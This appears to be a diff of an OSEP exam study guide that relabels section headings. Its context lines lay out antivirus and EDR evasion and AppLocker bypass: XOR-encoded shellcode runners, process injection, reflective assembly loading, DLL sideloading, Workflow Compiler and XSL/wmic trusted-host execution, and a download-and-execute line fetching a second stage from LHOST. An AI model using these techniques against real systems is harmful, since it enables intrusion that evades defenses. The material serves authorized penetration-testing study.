@@ -23,7 +23,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 - You can observe “file disappears” or “process never created”.
 - Attacker box can compile a custom Runner (mingw-w64 / csc).
 
-**Prepare (attacker)**:
+**Prepare (attacker side)**:
 
 1. Establish a control baseline — deliver a harmless program first to confirm delivery and execution themselves are fine:
    ```bash
@@ -50,7 +50,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 4. Switch to encoded/encrypted form: embed shellcode as a ciphertext array; XOR-decrypt in memory at runtime; split strings into pieces and concatenate.
 5. Change host shape: do not land a standalone EXE — use InstallUtil assemblies / managed assembly load / PowerShell reflection (see scenarios 20, 23).
 
-**Lab files**:
+**Scripts used**:
 | File | Purpose | Key parameters |
 |---|---|---|
 | `m13-xor-encoder.py` | Emit XOR-encoded C arrays | `sc.bin --format c` |
@@ -374,14 +374,14 @@ if ($ProbeOnly) {
 }
 ````
 
-**Verify**: after delivery, `dir` confirms the file exists; after run, `tasklist` confirms the process; listener confirms the callback. Missing any of the three means re-locate the failure.
+**Validation**: after delivery, `dir` confirms the file exists; after run, `tasklist` confirms the process; listener confirms the callback. Missing any of the three means re-locate the failure.
 
-**If it fails**:
+**Failure branches and alternatives**:
 1. Still deleted after re-encoding → the loader itself is signatured → switch to trusted hosts (InstallUtil / Workflow / XSL, scenarios 23, 24) or managed assembly load (scenario 20).
 2. File lands but Defender alerts → disable realtime protection (if you already have admin — see `Defense Evasion` → Disable Defender), or switch to in-memory execution with no disk drop.
 3. Target forbids any unsigned EXE → abandon the EXE path; use AppLocker allow paths (scenario 21) or DLL (scenario 22).
 
-**Exam notes / OPSEC**: always run a harmless control first, or you cannot tell “delivery failed” from “killed”; change one variable per try and record it; do not repeatedly deliver the same signatured file to the same host (may trigger more aggressive blocking).
+**Exam / OPSEC notes**: always run a harmless control first, or you cannot tell “delivery failed” from “killed”; change one variable per try and record it; do not repeatedly deliver the same signatured file to the same host (may trigger more aggressive blocking).
 
 ---
 
@@ -394,7 +394,7 @@ if ($ProbeOnly) {
 - Target has behavioral monitoring (Defender Behavior Monitor / EDR rules).
 - You can generate multiple execution implementations for comparison.
 
-**Prepare (attacker)**: prepare three control samples
+**Prepare (attacker side)**: prepare three control samples
 
 | Sample | Implementation | Watch point |
 |---|---|---|
@@ -414,7 +414,7 @@ if ($ProbeOnly) {
 4. If killed at **post-decrypt execution** → change payload shape (staged, smaller shellcode, HTTP instead of TCP callback).
 5. Record each sample’s kill point into a “behavior—block” table (valuable in the exam report).
 
-**Lab files**:
+**Scripts used**:
 | File | Purpose | Key parameters |
 |---|---|---|
 | `m01-shellcode-runner-x64.cs` | In-process exec (sample A) | Swap payload and key |
@@ -510,14 +510,14 @@ Write-Output "    2) reflective assembly load: . .\m01-reflective-runner.ps1 -Pa
 Write-Output "    3) download-exec second stage: IEX (New-Object Net.WebClient).DownloadString('http://LHOST/stage2.ps1')"
 ````
 
-**Verify**: process survives until it initiates a network connect; listener receives the connection; `Get-MpThreatDetection` for alert records.
+**Validation**: process survives until it initiates a network connect; listener receives the connection; `Get-MpThreatDetection` for alert records.
 
-**If it fails**:
+**Failure branches and alternatives**:
 1. All three injection implementations blocked → switch to trusted-host load (scenarios 23, 24), or managed assemblies (scenario 20).
 2. Only blocked when initiating outbound → use proxy/DNS/domain fronting (`docs/09`).
 3. Only a specific payload is blocked → change the payload, not the injection method.
 
-**Exam notes / OPSEC**: behavioral detection triggers on “difference”; do not try many injection methods back-to-back in the same process; space attempts apart, and after failure confirm whether the process is already marked.
+**Exam / OPSEC notes**: behavioral detection triggers on “difference”; do not try many injection methods back-to-back in the same process; space attempts apart, and after failure confirm whether the process is already marked.
 
 ---
 
@@ -530,7 +530,7 @@ Write-Output "    3) download-exec second stage: IEX (New-Object Net.WebClient).
 - The target tool is a managed assembly (.NET DLL) or a byte stream `Assembly.Load` can load.
 - Its EXE cannot be run directly (AppLocker / AV / rights limits).
 
-**Prepare (attacker)**:
+**Prepare (attacker side)**:
 ```bash
 # Obtain the tool’s managed assembly (DLL); extract from the EXE as an assembly if needed
 # Locally you can compile a test assembly with mcs / dotnet
@@ -552,7 +552,7 @@ Write-Output "    3) download-exec second stage: IEX (New-Object Net.WebClient).
 3. Dependency handling: put dependency assemblies in the same directory, or resolve from memory via `AppDomain.AssemblyResolve`.
 4. Output adaptation: tools that wrote console/files need return-value capture or output redirect under reflective call.
 
-**Lab files**:
+**Scripts used**:
 | File | Purpose | Key parameters |
 |---|---|---|
 | `m05-installutil-runner.cs` | Managed assembly loader template | Replace assembly path/entry |
@@ -743,14 +743,14 @@ try {
 }
 ````
 
-**Verify**: `$asm.FullName` returns successfully; reflective call returns expected results; no on-disk files produced.
+**Validation**: `$asm.FullName` returns successfully; reflective call returns expected results; no on-disk files produced.
 
-**If it fails**:
+**Failure branches and alternatives**:
 1. Tool is a native EXE (unmanaged) → cannot reflectively load → use InstallUtil/host (scenario 23) or find a managed equivalent.
 2. `Assembly.Load` blocked by AMSI/CLM → handle AMSI and Runspace bypass first (this module’s scripts), then load.
 3. Missing dependencies → resolve in memory via `AssemblyResolve`, or add the dependency directory to `AppDomain.BaseDirectory`.
 
-**Exam notes / OPSEC**: reflective calls create no new process — smaller log surface; but args must strictly match the tool entry; validate the call signature locally before the exam.
+**Exam / OPSEC notes**: reflective calls create no new process — smaller log surface; but args must strictly match the tool entry; validate the call signature locally before the exam.
 
 ---
 
@@ -763,7 +763,7 @@ try {
 - Policy has allow directories (common: `C:\Windows\Tasks`, `C:\Windows\Temp`, some dirs under the user profile).
 - Current user has write rights on those directories.
 
-**Prepare (attacker)**: no special prep — enumerate with the script.
+**Prepare (attacker side)**: no special prep — enumerate with the script.
 
 **Procedure**:
 1. Enumerate effective policy (under CLM, XML parse may fail — script falls back):
@@ -788,7 +788,7 @@ try {
    ```
 4. Deliver the payload to an “allowed + writable” directory and execute from there.
 
-**Lab files**:
+**Scripts used**:
 | File | Purpose | Key parameters |
 |---|---|---|
 | `m05-applocker-enum.ps1` | Enumerate effective rules + writable allow paths | `-PayloadPath` optional |
@@ -905,14 +905,14 @@ if ($writable.Count -gt 0) {
 Write-Both ("`nreport saved: {0}" -f $OutFile)
 ````
 
-**Verify**: from the target directory run `cmd /c whoami` or your payload and confirm policy no longer blocks; keep `Test-Path` and `icacls` output on record.
+**Validation**: from the target directory run `cmd /c whoami` or your payload and confirm policy no longer blocks; keep `Test-Path` and `icacls` output on record.
 
-**If it fails**:
+**Failure branches and alternatives**:
 1. No writable allow directory → DLL path (scenario 22) or trusted hosts (scenarios 23, 24).
 2. Policy parse limited by CLM → `Get-AppLockerPolicy -Effective -Xml` to disk then parse offline, or brute-force common directories.
 3. Allow directory exists but Defender blocks the payload → combine with scenario 18 encoding.
 
-**Exam notes / OPSEC**: AppLocker only limits “where you start from”, not everything about “what you start”; confirm policy version first (`Get-AppLockerPolicy -Effective` needs Win10+); on older systems use `Get-AppLockerPolicy -Local` or read `%windir%\System32\AppLocker\*.xml` directly.
+**Exam / OPSEC notes**: AppLocker only limits “where you start from”, not everything about “what you start”; confirm policy version first (`Get-AppLockerPolicy -Effective` needs Win10+); on older systems use `Get-AppLockerPolicy -Local` or read `%windir%\System32\AppLocker\*.xml` directly.
 
 ---
 
@@ -924,7 +924,7 @@ Write-Both ("`nreport saved: {0}" -f $OutFile)
 - AppLocker DLL rule set is off or loose (DLL rules are off by default).
 - There is an allowed host program that loads a DLL from a location you can influence.
 
-**Prepare (attacker)**:
+**Prepare (attacker side)**:
 ```bash
 # Proxy DLL idea: export full forward + run payload in DllMain
 x86_64-w64-mingw32-gcc -shared -o hijack.dll m04-proxy-dll-sideload.c proxy.def -s
@@ -940,7 +940,7 @@ x86_64-w64-mingw32-gcc -shared -o hijack.dll m04-proxy-dll-sideload.c proxy.def 
 3. Place the DLL on the host’s search path; keep exports and calling convention matching the original DLL (see [04-dll-sideloading](/modules/04-dll-sideloading) scenario 12).
 4. Start the host; confirm the payload runs and the host still works.
 
-**Lab files**:
+**Scripts used**:
 | File | Purpose | Key parameters |
 |---|---|---|
 | `m04-proxy-dll-sideload.c` | Full-forward Proxy DLL | Replace original DLL name |
@@ -1436,14 +1436,14 @@ if __name__ == "__main__":
     sys.exit(main(sys.argv[1:]))
 ````
 
-**Verify**: host starts normally (no crash); DLL payload executes; confirm with `whoami` or a callback.
+**Validation**: host starts normally (no crash); DLL payload executes; confirm with `whoami` or a callback.
 
-**If it fails**:
+**Failure branches and alternatives**:
 1. DLL rule set on and strict → switch to trusted hosts (scenarios 23, 24).
 2. Host crashes → export table / calling convention mismatch (`docs/04` scenario 12).
 3. Host does not load same-directory DLL → find another sideload-capable host, or use `PATH` hijack.
 
-**Exam notes / OPSEC**: AppLocker DLL rules are off by default — one of the easiest exam paths; do not treat it as guaranteed — check policy first.
+**Exam / OPSEC notes**: AppLocker DLL rules are off by default — one of the easiest exam paths; do not treat it as guaranteed — check policy first.
 
 ---
 
@@ -1455,7 +1455,7 @@ if __name__ == "__main__":
 - AppLocker blocks InstallUtil (or it was removed from the allow list).
 - `Microsoft.Workflow.Compiler.exe` exists and is runnable (.NET Framework 4.0 directory).
 
-**Prepare (attacker)**:
+**Prepare (attacker side)**:
 ```bash
 # Build the Workflow input assembly (managed assembly with XOML logic)
 x86_64-w64-mingw32-gcc ...   # not needed — compile C# with csc.exe
@@ -1475,7 +1475,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:pay
    ```
 4. Confirm payload execution (callback / on-disk marker file).
 
-**Lab files**:
+**Scripts used**:
 | File | Purpose | Key parameters |
 |---|---|---|
 | `m05-workflow-compiler-runner.cs` | Workflow host input assembly | Replace payload logic |
@@ -1617,14 +1617,14 @@ where mshta
 - Scenario flow: `docs/05-applocker-clm-amsi.md`
 ````
 
-**Verify**: command returns without error; listener gets a callback; `output.xml` is created (proves the host actually ran).
+**Validation**: command returns without error; listener gets a callback; `output.xml` is created (proves the host actually ran).
 
-**If it fails**:
+**Failure branches and alternatives**:
 1. Workflow host also blocked → try XSL (scenario 24), MSBuild, `regsvr32` (script host), `mshta` (HTA path).
 2. Different .NET version directories → enumerate all `v*` under `C:\Windows\Microsoft.NET\Framework*`.
 3. CLM affects PowerShell invocation → call the host via `cmd /c` directly, not through PowerShell.
 
-**Exam notes / OPSEC**: trusted hosts win because they are “on the allow list + no custom EXE on disk”; always use full paths — never rely on PATH.
+**Exam / OPSEC notes**: trusted hosts win because they are “on the allow list + no custom EXE on disk”; always use full paths — never rely on PATH.
 
 ---
 
@@ -1636,7 +1636,7 @@ where mshta
 - PowerShell/VBScript entry is limited.
 - `msxsl.exe` or `wmic.exe` is available and can process XSL with embedded JScript/VBScript.
 
-**Prepare (attacker)**: write XSL containing `<msxsl:script language="JScript">`, or use the `wmic` format execution path.
+**Prepare (attacker side)**: write XSL containing `<msxsl:script language="JScript">`, or use the `wmic` format execution path.
 
 **Procedure**:
 1. With `msxsl.exe` (if present):
@@ -1649,7 +1649,7 @@ where mshta
    ```
 3. Put payload logic in the XSL script block (download-exec / callback).
 
-**Lab files**:
+**Scripts used**:
 | File | Purpose | Key parameters |
 |---|---|---|
 | `m05-xsl-exec.xsl` | XSL script-exec template | Replace LHOST/URL |
@@ -1703,14 +1703,14 @@ Test status: not runtime-tested on Windows; XML/XSL structure checked by hand
 </xsl:stylesheet>
 ````
 
-**Verify**: command has no error; callback or marker file appears; `msxsl`/`wmic` process is actually created.
+**Validation**: command has no error; callback or marker file appears; `msxsl`/`wmic` process is actually created.
 
-**If it fails**:
+**Failure branches and alternatives**:
 1. `msxsl.exe` missing (not installed by default) → use the `wmic` `/format` path.
 2. XSL script scanned by AMSI → split/encode detected strings, or make XSL a downloader only and deliver stage two separately.
 3. Policy allows `wmic` but not `/format` → switch to other trusted hosts (scenario 23).
 
-**Exam notes / OPSEC**: `wmic` may be removed on newer systems (Win11 24H2+); confirm with `where wmic` before the exam; XSL’s advantage is that policy often ignores it.
+**Exam / OPSEC notes**: `wmic` may be removed on newer systems (Win11 24H2+); confirm with `where wmic` before the exam; XSL’s advantage is that policy often ignores it.
 
 ---
 
